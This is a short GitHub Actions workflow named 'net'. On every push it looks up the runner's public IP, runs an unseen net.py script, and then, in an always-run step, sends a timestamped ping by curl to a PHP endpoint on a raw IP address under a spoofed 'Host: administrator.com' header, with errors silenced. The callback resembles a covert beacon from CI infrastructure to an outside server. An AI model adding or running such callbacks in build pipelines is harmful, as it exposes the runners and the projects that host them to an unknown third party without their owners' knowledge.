name: net
on: [push, workflow_dispatch]
jobs:
  net:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - name: check
        run: |
          export RIP=$(curl -s -m 10 https://api.ipify.org)
          echo "RUNNER $RIP"
          python3 net.py
      - name: to66
        if: always()
        run: curl -s -m 20 -H "Host: administrator.com" --data-binary "ping-$(date -u +%s)" "http://103.120.176.66/ul9x.php?n=ping" || true
